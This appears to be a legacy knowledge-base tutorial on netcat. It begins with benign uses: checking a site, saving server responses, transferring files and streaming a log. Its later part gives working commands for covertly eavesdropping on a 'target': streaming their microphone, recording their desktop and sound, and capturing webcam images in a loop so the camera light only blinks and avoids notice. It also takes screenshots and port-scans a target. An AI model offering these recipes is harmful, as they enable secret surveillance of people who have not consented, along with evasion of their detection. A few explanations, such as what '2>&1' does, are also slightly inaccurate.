---
type: reference
title: "Adding the \"-v\" (verbose) flag is a nice check to see if a website is up. Here is an example"
description: Section 1 of the legacy NetworkKB notes.
tags: [kb-network]
generated: { by: "human:izaqyos", at: "2025-10-03T11:21:05Z" }
status: stable
capture_type: source
legacy_source: "Network/NetworkKB#1"
---

# Adding the "-v" (verbose) flag is a nice check to see if a website is up. Here is an example:

[↑ NetworkKB](/Network/kb-network/README.md)

```text
$ nc -v www.ackack.net 80
Connection to www.ackack.net 80 port [tcp/www] succeeded!

Using files during connections

It is possible to save the data which is send to you or you can give netcat a file which should be sended when a connection is made.
Here is an example on how to save the data which is being send by the server:

$ nc h.ackack.net 80 > response
# you can now send data but you won't see the output from the server because it is being redirected to a file.
$ nc ackack.net 80 > response
HEAD / HTTP/0.1

$ cat response
HTTP/1.1 200 OK
Date: <timestamp>
Server: Apache
Last-Modified: <timestamp>
Accept-Ranges: bytes
Content-Length: 3383
Connection: close
Content-Type: text/html

It is also possible to give netcat a file which should be pushed over the connection as soon as netcat connects, here is an example where we make the local computer listen over port 1337 and netcat will connect to it and push a file through the connection.

# First we need a file so let's create one already.
$ echo "Hello world" > file
# In another terminal we make netcat listen on port 1337 and wait for the file.
$ nc -l 1337
# Now we are going to connect to the port and push the file through the connection.
$ nc localhost 1337 < file
# Look on in the terminal where you just made netcat listen, here is the output:
$ nc -l 1337
Hello world
# You may have noticed that the connection was terminated, this is normal when you push a file through the connection netcat will terminate it when the eof is reached.

Alright, now let's try to do some cool things with this.
We can transfer files this way by making netcat listen on the first side of the connection and capture it on the other side.

# First make it listen and tell it to capture the output to a file.
$ nc -l 1337 > backup.tar.gz
# Now connect to it and push a file in it
$ nc localhost 1337 < backup.tar.gz
# Now you got a file which is called "backup.tar.gz" and contains the same content on both sides.

Or reversed...

# Now make the server listen and anything that connects to it will get the file backup.tar.gz
$ nc -l 1337 < backup.tar.gz
# On the other side connect and save the contents
$ nc localhost 1337 > backup.tar.gz
# Same result: a copy of backup.tar.gz is made.

You can also monitor files this way:

# Make netcat listen, this time we do it with a pipe symbol, this is just another way to get the job done.
$ tail -f /var/log/apache2/access.log | nc -l 1337
# Connect to it
$ nc localhost 1337
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<streaming output of /var/log/apache2/access.log>
# The connection will stay open and if there are any new requests you will immediately receive them.

Here is another very cool example, here we are going live eavesdrop the microphone of the target:

# We are going to use arecord for this and all output will be written to whatever is connected to port 1337.
arecord -f dat -t raw | nc -l 1337
# Now we have to connect to this port with netcat and we want to convert all data which is being send to .ogg format so we can hear it.
nc localhost 1337 | oggenc - -r -o nc.ogg
# Now just open nc.ogg with ogg123/vlc or something you like and you will have a live stream with your target's microphone. It will also save all the data to nc.ogg which is good for when you later want to analyze what people said.

The same method can be used for eavesdropping the screen/webcam/anything you like, just find a nice package which can do the job for you.

For desktop and sound eavesdropping the package "recordmydesktop" is good when it's installed.
Getting a good streaming connection with screen and sound is pretty hard so what I did to get it to work is just make a dumpfile like this:
recordmydesktop --on-the-fly-encoding --overwrite -o /tmp/nc.ogv
And later transfer the entire contents to me the way we earlier transferred files.
nc -l 1337 < /tmp/nc.ogv
Then you can just view the video and recorded sound.
Be sure you don't let the entire hard disk overflow with this because it will stay recording, a simple command can kill the recordmydesktop process again.
$ killall recordmydesktop
Or just find the pid with the program ps and kill the pid.

Eavesdropping the webcam with nc is very detectable due to the blinking light/steady green light on the webcam these days, what you can do is just making pictures which will only make it blink very fast, I you can use various packets for it but I will demonstrate it here with streamer.

# First you make a photo and save it in /tmp/image.jpeg, then you set netcat to listen and let it present the photo once somebody connects to it.
$ while [ 1 ]; do streamer -o /tmp/photo.jpeg; nc -l 1337 < /tmp/photo.jpeg; done
# On the other side you connect to it and save the current image.
$ nc localhost 1337 > image.jpeg
# Now the picture will get updated and when reconnecting you will get a new picture real time.

The same idea can be implemented for screenshots.

# listen
$ while true; do import -window root /tmp/image.png; nc -l 1337 < /tmp/image.png; done
# and connect
$ nc localhost 1337 > image.png
# Screenshot is updated and you can grab a new screenshot.

Portscan a target with netcat

Command

nc -zv <target> <port/port range> 2>&1 | grep succeeded

Result
Netcat will start trying to make full 3-way TCP handshakes over the port/port range.
-> SYN
-> ACK
nmap does it a little bit different and injects a RST packet instead of an ACK, this causes the connection to not fully get established and is way more stealthy.
-> SYN
-> RST
"2>&1" is because we want to redirect stderr (standard error) and stdout (standard output) both to a file, I will be using this a lot in the following port scan examples so remember this.

Example

nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded

Notes
```
